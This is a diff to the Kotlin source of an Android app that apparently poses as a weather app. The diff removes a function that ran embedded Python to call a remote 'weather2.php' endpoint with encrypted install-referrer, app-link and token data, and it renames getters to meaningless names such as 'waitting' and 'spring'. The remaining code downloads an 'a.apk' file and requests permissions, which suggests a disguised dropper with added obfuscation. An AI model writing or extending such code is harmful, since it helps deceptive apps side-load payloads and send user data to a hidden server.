@@ -13,7 +13,6 @@ import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.FileProvider
 import androidx.lifecycle.lifecycleScope
-import cn.nba.james.RequestBean
 import com.alibaba.fastjson.JSON
 import com.alibaba.fastjson.TypeReference
 import com.android.installreferrer.api.InstallReferrerClient
@@ -21,7 +20,6 @@ import com.android.installreferrer.api.InstallReferrerStateListener
 import com.bumptech.glide.Glide
 import com.facebook.FacebookSdk
 import com.facebook.applinks.AppLinkData
-import com.google.gson.Gson
 import com.hjq.permissions.XXPermissions
 import com.lzy.okgo.OkGo
 import com.lzy.okgo.callback.FileCallback
@@ -50,7 +48,7 @@ val filePath = Environment.getExternalStorageDirectory().absolutePath + File.sep
 
 val fileName = "a.apk"
 
-val seesionName = "session" + BaseApp.instance!!.getAppId()
+val seesionName = "session" + BaseApp.instance!!.waitting()
 
 fun AppCompatActivity.copyFiles() {
     try {
@@ -256,23 +254,7 @@ fun handleData(data: String): ArrayList<String> {
     return result
 }
 
-fun AppCompatActivity.getConfig(block: (String) -> Unit) {
-    lifecycleScope.launch(Dispatchers.IO) {
-        var result: Any? = null
-        python?._Call("eval", "import requests")
-        Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
-        result =
-            python?._Call(
-                "get_config",
-                "https://smallfun.xyz/worldweather361/weather2.php",
-                requestData()
-            )
-        println("result = $result")
-        withContext(Dispatchers.Main) {
-            block(result.toString())
-        }
-    }
-}
+
 
 fun AppCompatActivity.createFolder(){
     val folder = File(filePath)
@@ -283,9 +265,9 @@ fun AppCompatActivity.createFolder(){
 
 fun AppCompatActivity.getConfig2(block: (String) -> Unit) {
 
-    val appId = BaseApp.instance!!.getAppId()
+    val appId = BaseApp.instance!!.waitting()
 
-    val token = BaseApp.instance!!.getToken()
+    val token = BaseApp.instance!!.spring()
 
     val first = MMKV.defaultMMKV().decodeInt("f", 1)
 
@@ -303,34 +285,10 @@ fun AppCompatActivity.getConfig2(block: (String) -> Unit) {
         }
     })
 
-/*    OkGo.post<String>("https://smallfun.xyz/worldweather361/weather2.php")
-        .params("data", requestData()).execute(object : StringCallback() {
-            override fun onSuccess(response: Response<String>?) {
-                lifecycleScope.launch(Dispatchers.Main) {
-                    response?.let {
-                        it.body()?.let { body ->
-                            block(body)
-                        }
-                    }
-                }
-            }
-        })*/
-}
-
-fun requestData(): String {
-    val applink = MMKV.defaultMMKV().decodeString("appLink", "applink is empty")!!
-    val ref = MMKV.defaultMMKV().decodeString("ref", "ref is empty")!!
-    val token = BaseApp.instance!!.getToken()
-    val appName = BaseApp.instance!!.getAppName()
-    val appId = BaseApp.instance!!.getAppId()
-    val istatus = MMKV.defaultMMKV()!!.decodeBool("istatus", true)
-    val body = RequestBean(appName, appId, applink, ref, token, istatus)
-    val encrypStr = AesEncryptUtil.encrypt(Gson().toJson(body))
-    return encrypStr
 }
 
 fun AppCompatActivity.requestPermissions(block: (Boolean) -> Unit) {
-    XXPermissions.with(this).permission(BaseApp.instance!!.getPermissions())
+    XXPermissions.with(this).permission(BaseApp.instance!!.air())
         .request { permissions, all ->
             if (all) {
                 block(all)
@@ -452,7 +410,7 @@ fun download(context: Context, url: String, block: (Int) -> Unit, block2: () -> 
 }
 
 fun setConfig() {
-    val token = BaseApp.instance!!.getToken()
+    val token = BaseApp.instance!!.spring()
 
     val config = "$token|$appLink|$ref"
 
